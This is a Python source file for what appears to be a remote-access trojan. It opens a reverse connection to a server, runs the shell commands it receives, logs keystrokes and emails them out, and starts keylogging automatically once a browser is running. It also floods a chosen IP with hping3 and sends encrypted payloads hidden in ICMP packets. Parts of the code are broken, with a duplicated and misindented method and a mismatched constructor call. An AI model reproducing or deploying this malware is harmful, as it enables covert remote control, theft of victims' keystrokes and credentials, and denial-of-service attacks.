from scapy.all import *
from cryptography.fernet import Fernet
import sys
import socket
import struct
import smtplib
import os
import time
import psutil
import subprocess
import keyboard
import winreg
import paramiko
import requests
from bs4 import BeautifulSoup
import re
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import configparser

def read_config():
    config = configparser.ConfigParser()
    config.read('config.ini')
    return config
class EmailSender:
    def __init__(self):
        # Read email configuration from the config file
        config = read_config()
        email_config = config['Email']
        self.smtp_server = email_config['smtp_server']
        self.smtp_port = int(email_config['smtp_port'])
        self.username = email_config['username']
        self.password = email_config['password']

    def send_email_with_attachment(self, subject, message, attachment_path, recipients):
        # Create a multipart message
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = ", ".join(recipients)
        msg['Subject'] = subject

        # Add message body
        msg.attach(MIMEText(message, 'plain'))

        # Add attachment
        attachment_filename = os.path.basename(attachment_path)
        with open(attachment_path, "rb") as attachment_file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {attachment_filename}")
            msg.attach(part)

        # Send the email
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.login(self.username, self.password)
                server.send_message(msg)
            print("Email sent successfully!")
        except smtplib.SMTPException as e:
            print("Failed to send email. Error:", str(e))

class Victim:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client = None

    def connect_to_server(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("Msg: Client Initiated...")
        self.client.connect((self.server_ip, self.server_port))
        print("Msg: Connection initiated...")

    def online_interaction(self):
        while True:
            print("[+] Awaiting Shell Commands...")
            user_command = self.client.recv(1024).decode()

            if user_command.strip() == "exit":
                break

            if user_command.startswith("Attack"):
                command_parts = user_command.split()
                if len(command_parts) == 2:
                    ip_address = command_parts[1]
                    self.send_packets(ip_address)
            elif user_command.strip() == "StartRecording":
                self.start_recording()
            elif user_command.strip() == "StartWormActions":
                self.start_worm_actions()
            else:
                self.execute_command(user_command)

    
     def get_smtp_server_info(self):
        # Read browser configuration from the config file
        config = read_config()
        browsers_config = config['Browsers']

        detected_browsers = self.detect_browsers()

        for browser_name in detected_browsers:
            if browser_name.lower() in browsers_config:
                return browsers_config[browser_name.lower()].split(', ')

        # Default SMTP server information if browser detection fails
        return "smtp.example.com", 587

    def execute_command(self, user_command):
        op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()

        print("[+] Sending Command Output...")
        if output == b"" and output_error == b"":
            self.client.send(b"client_msg: no visible output")
        else:
            self.client.send(output + output_error)

    def send_email_with_keystrokes(self, keystrokes):
        smtp_server, smtp_port = self.get_smtp_server_info()

        email_sender = EmailSender(smtp_server, smtp_port, "your_email@example.com", "your_password")

        subject = 'Keystroke Log'
        message = f'Keystrokes captured: {keystrokes}'
        attachment_path = os.path.abspath(__file__)  # Attach the current script file

        email_sender.send_email_with_attachment(subject, message, attachment_path, [self.username])

    def start_recording(self):
        recorded_keystrokes = []

        def record_keystroke(event):
            if event.event_type == "down":
                if event.name == "space":
                    recorded_keystrokes.append(" ")
                else:
                    recorded_keystrokes.append(event.name)

        keyboard.hook(record_keystroke)

        print("Recording keystrokes. Press Enter to stop...")
        input()

        keyboard.unhook(record_keystroke)

        keystrokes = " ".join(recorded_keystrokes)
        self.send_email_with_keystrokes(keystrokes)

    def start_worm_actions(self):
        print("Waiting for network connection...")
        while True:
            try:
                # Try to establish a connection to a known host
                socket.create_connection(("www.example.com", 80))
                break
            except OSError:
                # Network connection failed, wait for a while before retrying
                time.sleep(10)
        print("Network connected.")

        print("Waiting for web browser activity...")
        while not self.is_browser_active():
            time.sleep(2)
        print("Web browser detected. Starting keystroke recording.")

        self.start_recording()

    def is_browser_active(self):
        for process in psutil.process_iter(['name']):
            if process.info['name'].lower() in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
                return True
        return False

    def send_packets(self, ip_address):
        hping_command = f"hping3 {ip_address} -d 65535 -c 0"
        process = subprocess.Popen(hping_command, shell=True)

    def get_smtp_server_info(self):
        browsers = {
            "chrome": {"smtp_server": "smtp.gmail.com", "smtp_port": 587},
            "firefox": {"smtp_server": "smtp.mozilla.org", "smtp_port": 587},
            "safari": {"smtp_server": "smtp.apple.com", "smtp_port": 587},
            "opera": {"smtp_server": "smtp.opera.com", "smtp_port": 587}
        }

        detected_browsers = self.detect_browsers()

        for browser_name in detected_browsers:
            if browser_name.lower() in browsers:
                return browsers[browser_name.lower()]["smtp_server"], browsers[browser_name.lower()]["smtp_port"]

        # Default SMTP server information if browser detection fails
        return "smtp.example.com", 587

    def detect_browsers(self):
        detected_browsers = []

        # Check running processes for known browser names
        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
                browser_name = os.path.splitext(process_name)[0]
                detected_browsers.append(browser_name)

        # Check Windows registry for browser information
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as start_menu_key:
                num_subkeys = winreg.QueryInfoKey(start_menu_key)[0]
                for i in range(num_subkeys):
                    subkey_name = winreg.EnumKey(start_menu_key, i)
                    detected_browsers.append(subkey_name)
        except OSError:
            pass

        return detected_browsers

def calculate_checksum(data):
    if len(data) % 2 == 1:
        data += b'\x00'
    checksum = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        checksum += w
    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = ~checksum & 0xffff
    return checksum

def encrypt_payload(payload, key):
    fernet = Fernet(key)
    encrypted_payload = fernet.encrypt(payload.encode())
    return encrypted_payload

def craft_icmp_packet(destination, payload):
    # Create IP header
    ip = IP(dst=destination)

    # Create ICMP header
    icmp = ICMP()

    # Set the type and code of the ICMP packet
    icmp.type = 8  # Echo Request
    icmp.code = 0

    # Encrypt the payload
    key = Fernet.generate_key()
    encrypted_payload = encrypt_payload(payload, key)

    # Craft the payload
    data = struct.pack('!H', os.getpid()) + key + encrypted_payload

    # Calculate the checksum
    checksum = calculate_checksum(icmp.build() + data)

    # Set the checksum in the ICMP header
    icmp.chksum = checksum

    # Construct the final packet
    packet = ip / icmp / data

    return packet

def send_icmp_packet(packet):
    try:
        send(packet)
        print("ICMP packet sent successfully!")
    except PermissionError:
        print("Permission denied. Run the program as root/administrator.")
    except socket.error as e:
        print("Error sending ICMP packet:", str(e))

if __name__ == '__main__':
    destination_ip = ''  # Replace with the destination IP address
    plaintext_payload = """Your payload here"""  # Replace with your desired payload

    packet = craft_icmp_packet(destination_ip, plaintext_payload)
    send_icmp_packet(packet)
